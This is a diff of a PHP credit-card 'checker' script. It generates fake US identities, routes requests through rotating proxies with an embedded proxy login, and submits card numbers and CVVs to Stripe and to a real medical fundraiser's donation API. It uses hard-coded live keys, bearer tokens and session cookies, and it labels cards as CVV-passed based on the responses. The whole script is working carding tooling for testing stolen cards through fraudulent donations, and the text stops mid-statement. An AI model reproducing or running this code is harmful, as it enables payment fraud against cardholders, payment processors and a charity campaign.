@@ -1,10 +1,12 @@
 <?php
 
-#---------------------------------------------------------------------------------------------------------------------------------#
-#---------------------------------------------------[MADE BY @ANONBD]----------------------------------------------------#
-#---------------------------------------------------------------------------------------------------------------------------------#
- 
+//=============================================================//
+//================[Made By :- [🇮🇳]DRAGON MASTER]===============//
+//============[Join OUR TEAM   @DragonBin + @DRAGONCCCHECKER]==//
 
+
+
+//================[Functions and Variables]================//
 require 'function.php';
 
 error_reporting(0);
@@ -62,97 +64,192 @@ function mod($dividendo,$divisor)
 {
     return round($dividendo - (floor($dividendo/$divisor)*$divisor));
 }
+//================[Functions and Variables]================//
 
-////////////////////////////===[Randomizing Details Api]
 
-$name = ucfirst(str_shuffle('kurumi'));
-$last = ucfirst(str_shuffle('appisbest'));
-
-$first1 = str_shuffle("kurumiapp85246");
-$serve_arr = array("gmail.com","hotmail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
+//==================[Randomizing Details]======================//
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_COOKIE, 1); 
+curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+$resposta = curl_exec($ch);
+$firstname = value($resposta, '"first":"', '"');
+$lastname = value($resposta, '"last":"', '"');
+$phone = value($resposta, '"phone":"', '"');
+$zip = value($resposta, '"postcode":', ',');
+$postcode = value($resposta, '"postcode":', ',');
+$state = value($resposta, '"state":"', '"');
+$email = value($resposta, '"email":"', '"');
+$city = value($resposta, '"city":"', '"');
+$street = value($resposta, '"street":"', '"');
+$numero1 = substr($phone, 1,3);
+$numero2 = substr($phone, 6,3);
+$numero3 = substr($phone, 10,4);
+$phone = $numero1.''.$numero2.''.$numero3;
+$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
 $serv_rnd = $serve_arr[array_rand($serve_arr)];
-$email = "".$first1."%40".$serv_rnd."";
+$email= str_replace("example.com", $serv_rnd, $email);
+if($state=="Alabama"){ $state="AL";
+}else if($state=="alaska"){ $state="AK";
+}else if($state=="arizona"){ $state="AR";
+}else if($state=="california"){ $state="CA";
+}else if($state=="olorado"){ $state="CO";
+}else if($state=="connecticut"){ $state="CT";
+}else if($state=="delaware"){ $state="DE";
+}else if($state=="district of columbia"){ $state="DC";
+}else if($state=="florida"){ $state="FL";
+}else if($state=="georgia"){ $state="GA";
+}else if($state=="hawaii"){ $state="HI";
+}else if($state=="idaho"){ $state="ID";
+}else if($state=="illinois"){ $state="IL";
+}else if($state=="indiana"){ $state="IN";
+}else if($state=="iowa"){ $state="IA";
+}else if($state=="kansas"){ $state="KS";
+}else if($state=="kentucky"){ $state="KY";
+}else if($state=="louisiana"){ $state="LA";
+}else if($state=="maine"){ $state="ME";
+}else if($state=="maryland"){ $state="MD";
+}else if($state=="massachusetts"){ $state="MA";
+}else if($state=="michigan"){ $state="MI";
+}else if($state=="minnesota"){ $state="MN";
+}else if($state=="mississippi"){ $state="MS";
+}else if($state=="missouri"){ $state="MO";
+}else if($state=="montana"){ $state="MT";
+}else if($state=="nebraska"){ $state="NE";
+}else if($state=="nevada"){ $state="NV";
+}else if($state=="new hampshire"){ $state="NH";
+}else if($state=="new jersey"){ $state="NJ";
+}else if($state=="new mexico"){ $state="NM";
+}else if($state=="new york"){ $state="LA";
+}else if($state=="north carolina"){ $state="NC";
+}else if($state=="north dakota"){ $state="ND";
+}else if($state=="Ohio"){ $state="OH";
+}else if($state=="oklahoma"){ $state="OK";
+}else if($state=="oregon"){ $state="OR";
+}else if($state=="pennsylvania"){ $state="PA";
+}else if($state=="rhode Island"){ $state="RI";
+}else if($state=="south carolina"){ $state="SC";
+}else if($state=="south dakota"){ $state="SD";
+}else if($state=="tennessee"){ $state="TN";
+}else if($state=="texas"){ $state="TX";
+}else if($state=="utah"){ $state="UT";
+}else if($state=="vermont"){ $state="VT";
+}else if($state=="virginia"){ $state="VA";
+}else if($state=="washington"){ $state="WA";
+}else if($state=="west virginia"){ $state="WV";
+}else if($state=="wisconsin"){ $state="WI";
+}else if($state=="wyoming"){ $state="WY";
+}else{$state="KY";} 
 
-$street = "".rand(0000,9999)."+Main+Street";
-$ph = array("682","346","246");
-$ph1 = array_rand($ph);
-$phh = $ph[$ph1];
-$phone = "$phh".rand(0000000,9999999)."";
+//==============[Randomizing Details-END]======================//
 
-$st = array("SouthYorkshire","EastSussex","London","Cornwall","Down");
-$st1 = array_rand($st);
-$state = $st[$st1];
-if ($state == "SouthYorkshire"){
-$zip = "S702EP";
-$city = "Barnsley";
+//==================[BIN LOOK-UP]======================//
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'Host: lookup.binlist.net',
+'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
+'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, '');
+$fim = curl_exec($ch);
+$bank1 = GetStr($fim, '"bank":{"name":"', '"');
+$name2 = GetStr($fim, '"name":"', '"');
+$brand = GetStr($fim, '"brand":"', '"');
+$country = GetStr($fim, '"country":{"name":"', '"');
+$emoji = GetStr($fim, '"emoji":"', '"');
+$name1 = "".$name2."".$emoji."";
+$scheme = GetStr($fim, '"scheme":"', '"');
+$type = GetStr($fim, '"type":"', '"');
+$currency = GetStr($fim, '"currency":"', '"');
+if(strpos($fim, '"type":"credit"') !== false){
 }
-elseif ($state == "EastSussex"){
-$zip = "BN35TD";
-$city = "Hove";
-}
-elseif ($state == "London"){
-$zip = "W1B5PA";
-$city = "Soho";
-}
-elseif ($state == "Cornwall"){
-$zip = "TR196JU";
-$city = "Penzance";
-}
-else{
-$zip = "BT210AG";
-$city = "Donaghadee";
-};
-/////////////////////==============[Init Proxy Section]===============//////////////////////////////
-///////////////////////////===[Webshare proxys for cc checker]===////////////////////////////////////
-$Websharegay = rand(0,250);
+curl_close($ch);
+//==================[BIN LOOK-UP-END]======================//
+
+
+//==================[BIN LOOK-UP]======================//
+$ch = curl_init();
+$bin = substr($cc, 0,6);
+curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+$bindata = curl_exec($ch);
+$binna = json_decode($bindata,true);
+$brand = $binna['scheme'];
+$country = $binna['country']['name'];
+$type = $binna['type'];
+$bank = $binna['bank']['name'];
+curl_close($ch);
+//==================[BIN LOOK-UP-END]======================//
+
+//=======================[Proxys]=============================//
 $rp1 = array(
-  1 => 'allhxpvu-rotate:xksjbgb5y21k',
+  1 => 'allhxpvu-rotate:xksjbgb5y21k', /// [ex :-
     ); 
-    $rotate = $rp1[array_rand($rp1)];
-//////////////////////////==============[Proxy Section]===============//////////////////////////////
-$ch = curl_init('https://api.ipify.org/');
-curl_setopt_array($ch, [
-CURLOPT_RETURNTRANSFER => true,
-CURLOPT_PROXY => 'http://p.webshare.io:80',
-CURLOPT_PROXYUSERPWD => $rotate,
-CURLOPT_HTTPGET => true,
-]);
+    $rpt = array_rand($rp1);
+    $rotate = $rp1[$rpt];;
+
+
+$ip = array(
+  1 => 'socks5://p.webshare.io:1080',
+  2 => 'http://p.webshare.io:80',
+    ); 
+    $socks = array_rand($ip);
+    $socks5 = $ip[$socks];
+
+$url = "https://api.ipify.org/";
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_PROXY, $socks5);
+curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
 $ip1 = curl_exec($ch);
 curl_close($ch);
-ob_flush();  
+ob_flush();
 if (isset($ip1)){
-//$ip = $ip1;
 $ip = "Proxy live";
 }
 if (empty($ip1)){
 $ip = "Proxy Dead:[".$rotate."]";
 }
 
-echo '[ IP: '.$ip.' ] ';
-///////////////////////==============[End Proxy Section]===============//////////////////////////////#-------------------
-# -------------------- [1 REQ] -------------------#
+//echo '[ IP: '.$ip.' ] ';
+//=======================[Proxys END]=============================//
 
+
+//=======================[1 REQ]==================================//
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
-curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
+curl_setopt($ch, CURLOPT_URL, 'https://www.ketto.org/api/fundraisers/167947/order');
 curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-  'authority: api.stripe.com',
-  'method: POST',
-  'path: /v1/payment_methods',
-  'scheme: https',
-  'accept: application/json',
-  'accept-language: en-US,en;q=0.5',
-  'content-type: application/x-www-form-urlencoded',
-  'origin: https://js.stripe.com',
-  'referer: https://js.stripe.com/',
-  'sec-fetch-dest: empty',
-  'sec-fetch-mode: cors',
-  'sec-fetch-site: same-site',
-  'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
-  ));
+'authority: www.ketto.org',
+'method: POST',
+'path: /api/fundraisers/167947/order',
+'scheme: https',
+'accept: application/json, text/plain, */*',
+'accept-language: en-US,en;q=0.5',
+'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczpcL1wvYXBpcy5rZXR0by5vcmdcL2FwaVwvZnVuZHJhaXNlcnNcLzIxMjY1NVwvY2FydCIsImlhdCI6MTY0Nzk4NDMwOCwiZXhwIjoxNjQ5MTkzOTA4LCJuYmYiOjE2NDc5ODQzMDgsImp0aSI6IkxTdUlNYTRwd05rbFlFZGoiLCJzdWIiOjYwMDc4MDYsInBydiI6Ijg3ZTBhZjFlZjlmZDE1ODEyZmRlYzk3MTUzYTE0ZTBiMDQ3NTQ2YWEifQ.Ro0Q7GaSbRY_7keJiL1ZvMgKBre58p3BC_aULLX8GW4',
+'content-type: application/json',
+'Cookie: k_utm=eyJ1dG1fc291cmNlIjoiZXh0ZXJuYWxfS2V0dG8iLCJ1dG1fbWVkaXVtIjoiZ29vZ2xlLXNlYXJjaCIsInV0bV90ZXJtIjoiYl8gZG9uYXRlIiwidXRtX2NvbnRlbnQiOiJkb25hdGlvbl9yZXNwX2FkMSIsInV0bV9jYW1wYWlnbiI6IlMxNF83MDAwX1NBTEVfRG9uYXRpb25fS1lfQUxMX0NMS19JTkQiLCJ1dG1fcGxhY2VtZW50IjoiS1QyOF9BR18xODY1X0RvbmF0aW9uX0dlbmVyaWMifQ%3D%3D; ip_location=eyJjb3VudHJ5X2NvZGUiOiJCRCIsImNvdW50cnlfbmFtZSI6IkJhbmdsYWRlc2giLCJyZWdpb25fbmFtZSI6IkRoYWthIiwiemlwX2NvZGUiOiIxMzEyIiwiY2l0eV9uYW1lIjoiRGhha2EifQ%3D%3D; _ku=6d8e39d191072715c435c8b6deb19074; …86guoUBTcACwcj9ynIIxWQ; __stripe_mid=501711e5-49bd-41df-82ea-f8e51f18d63eaae335; _vis_opt_exp_578_goal_1=1; WZRK_S_4R6-478-RR4Z=%7B%22p%22%3A1%2C%22s%22%3A1647986665%2C%22t%22%3A1647986686%7D; _nv_sess=11700203.1647986668.98PD1G88rMGKWuvRnBsJH3bN0gctrf16Qe0UrUX3r6hn55Ws53; _gat_tracker=1; outbrain_cid_fetch=true; _hjIncludedInSessionSample=0; _hjSession_200024=eyJpZCI6IjZlZTU5OTg5LTQyY2UtNDg3Ny04OWQ0LTgxYzYwOTYxMzIzNiIsImNyZWF0ZWQiOjE2NDc5ODY2ODIxOTEsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1',
+'origin: https://www.ketto.org',
+'referer: https://www.ketto.org/fundraiser/offer-a-helping-hand-to-support-rohit-sharmas-treatment?donate=true&payment=options',
+'sec-fetch-dest: empty',
+'sec-fetch-mode: cors',
+'sec-fetch-site: same-site',
+'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36',
+));
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
@@ -162,19 +259,18 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[address][city]='.$city.'&billing_details[address][country]=GB&billing_details[address][line1]='.$street.'&billing_details[address][postal_code]='.$zip.'&billing_details[name]='.$name.'+'.$last.'&billing_details[email]='.$email.'&billing_details[phone]=02891889380&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=8a222f87-65f7-4425-a54a-b6349c1249bf0c6a7f&muid=70332369-bb41-4cc5-ba84-9fc949d2d422cdce1f&sid=37d4f8e7-fdf8-4002-965b-748174a808965b5e9c&pasted_fields=number&payment_user_agent=stripe.js%2F2c2f921d4%3B+stripe-js-v3%2F2c2f921d4&time_on_page=467246&key=pk_live_iBIpeqzKOOx2Y8PFCRBfyMU000Q7xVG4Sn&_stripe_account=acct_1JxZFe2ET84rWsFO');
+curl_setopt($ch, CURLOPT_POSTFIELDS, '{"campaign_id":167947,"cart_id":11960024,"mode":"CARD","gateway":"ketto","mode_value":"' . $brand . '","bin":"529205","page_type":"campaign","ab_testname":"Prod - Donor Tip A/B","ab_value":"Control","vpa":"","tenure":"","payment_gateway":"","is_indian":"","cause_id":"","donor_pincode":"'.$zip.'","utm_campaign":"S14_7000_SALE_Donation_KY_ALL_CLK_IND","utm_medium":"google-search","utm_source":"external_Ketto","utm_term":"b_ donate","utm_content":"donation_resp_ad1","utm_placement":"KT28_AG_1865_Donation_Generic"}');
+
+ $result1 = curl_exec($ch);
+ $id = trim(strip_tags(getStr($result1,'"id": "','"')));
+//=======================[1 REQ-END]==============================//
 
 
-
-$result1 = curl_exec($ch);
-$id = trim(strip_tags(getStr($result1,'"id": "','"')));
-
-# -------------------- [2 REQ] -------------------#
-
+//=======================[2 REQ]==================================//
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
-curl_setopt($ch, CURLOPT_URL, 'https://shopanddonate.org/?wc-ajax=checkout');
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -185,334 +281,168 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
     curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'authority: shopanddonate.org',
+'authority: api.stripe.com',
 'method: POST',
-'path: /?wc-ajax=checkout',
+'path: /v1/tokens',
 'scheme: https',
-'accept: application/json, text/javascript, */*; q=0.01',
-'accept-language: en-US,en;q=0.5',
-'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-'Cookie: byconsolewooodt_delivery_widget_cookie=%7B%22byconsolewooodt_widget_date_field%22%3A%22%22%2C%22byconsolewooodt_widget_time_field%22%3A%22%22%2C%22byconsolewooodt_widget_type_field%22%3A%22levering%22%2C%22byconsolewooodt_widget_pickup_location%22%3A%22%22%7D; mailchimp_landing_site=https%3A%2F%2Fshopanddonate.org%2Fshop%2F; cookielawinfo-checkbox-necessary=yes; cookielawinfo-checkbox-functional=yes; cookielawinfo-checkbox-performance=yes; cookielawinfo-checkbox-analytics=yes; cookielawinfo-checkbox-adverti…b8fb8311875ce6b887a1a4264251; woocommerce_items_in_cart=1; woocommerce_cart_hash=07699c5f52fe600d4db7335d4fbf7fd8; __stripe_mid=70332369-bb41-4cc5-ba84-9fc949d2d422cdce1f; __stripe_sid=37d4f8e7-fdf8-4002-965b-748174a808965b5e9c; __ssid=9ccaaffbea63b20135a9b1ffefc6261; mailchimp.cart.current_email=xsodxpad@cutradition.com; wordpress_logged_in_585d4e80731bb1c01687ee41a2b0d518=xsodxpad%7C1649184105%7CBYebvjOlYYrpTcSBXuCaQsvGdxSOtyHFUk7QXUUPqzR%7Cd78eed1a9033ac9b9f63ea34553d4932d5916a269f23502748b7f434880fb80b',
-'origin: https://shopanddonate.org',
-'referer: https://shopanddonate.org/checkout/',
+'accept: application/json',
+'accept-language: en-US,en;q=0.9',
+'content-type: application/x-www-form-urlencoded',
+'cookie: ',
+'origin: https://js.stripe.com',
+'referer: https://js.stripe.com/',
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
-'sec-fetch-site: same-site',
-'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
-'X-Requested-With: XMLHttpRequest',
-));
+'sec-fetch-site: same-origin',
+'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36',
+'x-requested-with: XMLHttpRequest',
+   ));
+
 # ----------------- [2req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'byconsolewooodt_delivery_type=levering&byconsolewooodt_delivery_date=31+Mar+2022&byconsolewooodt_delivery_date_alternate=31%2F3%2F2022&byconsolewooodt_delivery_time=10%3A00+-+10%3A30&billing_first_name='.$name.'&billing_last_name='.$last.'&billing_company=&billing_country=GB&billing_address_1='.$street.'&billing_address_2=&billing_city=Donaghadee&billing_state=&billing_postcode='.$zip.'&billing_phone=02891889380&billing_email='.$email.'&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=GB&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=&shipping_postcode=&order_comments=&shipping_method%5B0%5D=flat_rate%3A1&payment_method=woocommerce_payments&wcpay-payment-method='.$id.'&terms=on&terms-field=1&woocommerce-process-checkout-nonce=a489ea454c&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'time_on_page=1047&guid=NA&muid=501711e5-49bd-41df-82ea-f8e51f18d63eaae335&sid=NA&key=pk_live_LmAKiI3ufRxxsl84CsNkt812&payment_user_agent=stripe.js%2F78ef418&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'');
 
+  $result2 = curl_exec($ch);
+ $message = trim(strip_tags(getstr($result2,'"message":"','"')));
+$token = trim(strip_tags(getstr($result2,'"id":"','"')));
 
-$result2 = curl_exec($ch);
+//=======================[2 REQ-END]==============================//
+
+//=======================[3 REQ]==================================//
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
+curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
+curl_setopt($ch, CURLOPT_URL, 'https://www.ketto.org/api/payment/send');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'authority: www.ketto.org',
+'method: POST',
+'path: /api/payment/send',
+'scheme: https',
+'accept: pplication/json, text/plain, */*',
+'accept-language: en-US,en;q=0.5',
+'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczpcL1wvYXBpcy5rZXR0by5vcmdcL2FwaVwvZnVuZHJhaXNlcnNcLzIxMjY1NVwvY2FydCIsImlhdCI6MTY0Nzk4NDMwOCwiZXhwIjoxNjQ5MTkzOTA4LCJuYmYiOjE2NDc5ODQzMDgsImp0aSI6IkxTdUlNYTRwd05rbFlFZGoiLCJzdWIiOjYwMDc4MDYsInBydiI6Ijg3ZTBhZjFlZjlmZDE1ODEyZmRlYzk3MTUzYTE0ZTBiMDQ3NTQ2YWEifQ.Ro0Q7GaSbRY_7keJiL1ZvMgKBre58p3BC_aULLX8GW4',
+'content-type: application/json',
+'cookie: k_utm=eyJ1dG1fc291cmNlIjoiZXh0ZXJuYWxfS2V0dG8iLCJ1dG1fbWVkaXVtIjoiZ29vZ2xlLXNlYXJjaCIsInV0bV90ZXJtIjoiYl8gZG9uYXRlIiwidXRtX2NvbnRlbnQiOiJkb25hdGlvbl9yZXNwX2FkMSIsInV0bV9jYW1wYWlnbiI6IlMxNF83MDAwX1NBTEVfRG9uYXRpb25fS1lfQUxMX0NMS19JTkQiLCJ1dG1fcGxhY2VtZW50IjoiS1QyOF9BR18xODY1X0RvbmF0aW9uX0dlbmVyaWMifQ%3D%3D; ip_location=eyJjb3VudHJ5X2NvZGUiOiJCRCIsImNvdW50cnlfbmFtZSI6IkJhbmdsYWRlc2giLCJyZWdpb25fbmFtZSI6IkRoYWthIiwiemlwX2NvZGUiOiIxMzEyIiwiY2l0eV9uYW1lIjoiRGhha2EifQ%3D%3D; _ku=6d8e39d191072715c435c8b6deb19074; …86guoUBTcACwcj9ynIIxWQ; __stripe_mid=501711e5-49bd-41df-82ea-f8e51f18d63eaae335; _vis_opt_exp_578_goal_1=1; WZRK_S_4R6-478-RR4Z=%7B%22p%22%3A1%2C%22s%22%3A1647986665%2C%22t%22%3A1647986719%7D; _nv_sess=11700203.1647986668.98PD1G88rMGKWuvRnBsJH3bN0gctrf16Qe0UrUX3r6hn55Ws53; _gat_tracker=1; outbrain_cid_fetch=true; _hjIncludedInSessionSample=0; _hjSession_200024=eyJpZCI6IjZlZTU5OTg5LTQyY2UtNDg3Ny04OWQ0LTgxYzYwOTYxMzIzNiIsImNyZWF0ZWQiOjE2NDc5ODY2ODIxOTEsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1',
+'origin: https://www.ketto.org',
+'referer: https://www.ketto.org/fundraiser/offer-a-helping-hand-to-support-rohit-sharmas-treatment?donate=true&payment=options',
+'sec-fetch-dest: empty',
+'sec-fetch-mode: cors',
+'sec-fetch-site: same-origin',
+'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36',
+'x-requested-with: XMLHttpRequest',
+   ));
+
+# ----------------- [3req Postfields] ---------------------#
+
+curl_setopt($ch, CURLOPT_POSTFIELDS,'{"order_id":"ORD1647988291712712303657","return_url":"https://www.ketto.org/new/payment-route?or=f&id=167947&oi=ORD1647988291712712303657&ct=offer-a-helping-hand-to-support-rohit-sharmas-treatment&pcurrency=USD&cause=Medical&dnr=fs&lpm=strp&last_pay_mode=CARD","token":"'.$token.'","token_1":"","save_card":"","customer_id":null,"account_no":"","ifsc_code":"","bank_code":"","bank_name":""}');
+$result3 = curl_exec($ch);
+$message = trim(strip_tags(getstr($result3,'"message":"','"')));
 $info = curl_getinfo($ch);
 $time = $info['total_time'];
 
-///////////////////////// Bin Lookup Api //////////////////////////
-
-// this is for additional info - so result will look more good by adding the info of the bin
-
-$bin = substr("$cc", 0, 6);
+//=======================[3 REQ-END]==============================//
 
 
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
-curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'Host: lookup.binlist.net',
-'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
-'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_POSTFIELDS, '');
-$fim = curl_exec($ch);
-$bank = getStr($fim, '"bank":{"name":"', '"');
-$name = getStr($fim, '"name":"', '"');
-$brand = getStr($fim, '"brand":"', '"');
-$country = getStr($fim, '"country":{"name":"', '"');
-$type = getStr($fim, '"type":"', '"');
 
-if(strpos($fim, '"type":"credit"') !== false) {
-  $type = 'Credit';
-} else {
-  $type = 'Debit';
-}
-function getbnk($bin)
-{
- sleep(rand(1,6));
-$bin = substr($bin,0,6);
-$url = 'http://bins.su';
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_URL,$url);
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=searchbins&bins='.$bin.'&BIN=&country=');
-$result=curl_exec($ch);
-curl_close($ch);
+//=======================[MADE BY]==============================//
+
+$MADEBY = "[ (🇮🇳)DRAGON MASTER ]";
+
+//[You Have  To Change Name Here Automatically In All Response Will Change ]//
+
+//=======================[MADE BY]==============================//
 
 
-if (preg_match_all('(<tr><td>'.$bin.'</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td></tr>)siU', $result, $matches1))
-{
-$r1 = $matches1[1][0];
-$r2 = $matches1[2][0];
-$r3 = $matches1[3][0];
-$r4 = $matches1[4][0];
-$r5 = $matches1[5][0];
- return "$r2 - $r1 - $r3 - $r4 - $r5";
+//=======================[Responses]==============================//
 
-}
-else
-{
- return "$bin|Unknown.";
-}
+# - [CVV Responses ] - #
+
+if ((strpos($result3, '"cvc_check":"pass"')) || (strpos($result3, "Thank You.")) || (strpos($result3, 'Your card zip code is incorrect.')) || (strpos($result3, "Thank You For Donation.")) || (strpos($result3, "incorrect_zip")) || (strpos($result3, "Success ")) || (strpos($result3, '"type":"one-time"')) || (strpos($result3, "/donations/thank_you?donation_number="))){
+    echo '<br><span class="badge badge-success">#CVV ✓ </span> : ' . $lista . ' ➜  CVV PASS ➜ </span> ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
 }
 
-# ----------------------------------------------------------- [Responses] ------------------------------------------------------- #
-
-
-
-# ------------------------------------------------- [CVV Responses ] ------------------------------------------------------------ #
-
-if
-(strpos($result2,  '"cvc_check": "pass"')) {
-  echo '</br><span class="badge badge-success"APPROVED!</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">{MSG:- CVC MATCHED}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
-} 
-
-elseif
-(strpos($result2,  "Thank You For Donation.")) {
-    echo '</br><span class="badge badge-success">👑 APPROVED! 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCV MATCHED {MSG:- Thank You For Donation.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
-} 
-
-elseif
-(strpos($result2,  '"Thank You For Donation."')) {
